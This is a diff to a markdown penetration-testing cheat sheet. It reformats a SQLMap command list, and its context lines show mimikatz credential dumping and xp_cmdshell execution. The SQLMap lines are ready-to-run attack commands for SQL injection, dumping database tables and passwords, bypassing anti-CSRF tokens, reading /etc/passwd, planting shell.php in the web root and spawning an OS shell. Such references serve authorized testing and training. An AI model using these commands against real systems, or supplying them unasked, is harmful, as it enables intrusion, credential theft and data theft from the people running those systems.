@@ -276,30 +276,55 @@ EXEC xp_cmdshell 'whoami'
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 #### SQLMap:
-##### *View the basic help menu*
+
+##### View the basic help menu
 ```sqlmap -h ```
-View the advanced help menu:
+
+##### View the advanced help menu:
 ```sqlmap -hh ```
-```sqlmap -u "http://www.example.com/vuln.php?id=1" --batch``` 	Run SQLMap without asking for user input
-```sqlmap 'http://www.example.com/' --data 'uid=1&name=test' ```	SQLMap with POST request
-```sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'``` 	POST request specifying an injection point with an asterisk
-```sqlmap -r req.txt``` 	Passing an HTTP request file to SQLMap
-```sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'``` 	Specifying a cookie header
-```sqlmap -u www.target.com --data='id=1' --method PUT``` 	Specifying a PUT request
-```sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt``` 	Store traffic to an output file
-```sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch``` 	Specify verbosity level
-```sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"``` 	Specifying a prefix or suffix
-```sqlmap -u www.example.com/?id=1 -v 3 --level=5``` 	Specifying the level and risk
-```sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba``` 	Basic DB enumeration
-```sqlmap -u "http://www.example.com/?id=1" --tables -D testdb``` 	Table enumeration
-```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname``` 	Table/row enumeration
-```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'" ```	Conditional enumeration
-```sqlmap -u "http://www.example.com/?id=1" --schema``` 	Database schema enumeration
-```sqlmap -u "http://www.example.com/?id=1" --search -T user``` 	Searching for data
-```sqlmap -u "http://www.example.com/?id=1" --passwords --batch``` 	Password enumeration and cracking
-```sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"``` 	Anti-CSRF token bypass
-```sqlmap --list-tampers``` 	List all tamper scripts
-```sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba``` 	Check for DBA privileges
-```sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"``` 	Reading a local file
-```sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"``` 	Writing a file
-```sqlmap -u "http://www.example.com/?id=1" --os-shell``` 	Spawning an OS shell
+##### Run SQLMap without asking for user input
+```sqlmap -u "http://www.example.com/vuln.php?id=1" --batch``` 
+##### SQLMap with POST request:
+```sqlmap 'http://www.example.com/' --data 'uid=1&name=test' ```	
+##### POST request specifying an injection point with an asterisk:
+```sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'``` 	
+##### Passing an HTTP request file to SQLMap:
+```sqlmap -r req.txt```
+##### Specifying a cookie header:
+```sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'``` 	
+##### Specifying a PUT request:
+```sqlmap -u www.target.com --data='id=1' --method PUT``` 	
+##### Store traffic to an output file:
+```sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt``` 	
+##### Specify verbosity level:
+```sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch``` 	
+##### Specifying a prefix or suffix:
+```sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"``` 	
+##### Specifying the level and risk:
+```sqlmap -u www.example.com/?id=1 -v 3 --level=5``` 	
+##### Basic DB enumeration:
+```sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba``` 	
+##### Table enumeration:
+```sqlmap -u "http://www.example.com/?id=1" --tables -D testdb``` 	
+##### Table/row enumeration:
+```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname``` 	
+##### 	Conditional enumeration:
+```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'" ```
+##### Database schema enumeration:
+```sqlmap -u "http://www.example.com/?id=1" --schema``` 	
+##### Searching for data:
+```sqlmap -u "http://www.example.com/?id=1" --search -T user``` 	
+##### Password enumeration and cracking:
+```sqlmap -u "http://www.example.com/?id=1" --passwords --batch```
+##### Anti-CSRF token bypass:
+```sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"``` 	
+##### List all tamper scripts:
+```sqlmap --list-tampers``` 	
+##### Check for DBA privileges:
+```sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba``` 	
+##### Reading a local file:
+```sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"``` 	
+##### Writing a file:
+```sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"``` 	
+##### Spawning an OS shell:
+```sqlmap -u "http://www.example.com/?id=1" --os-shell```
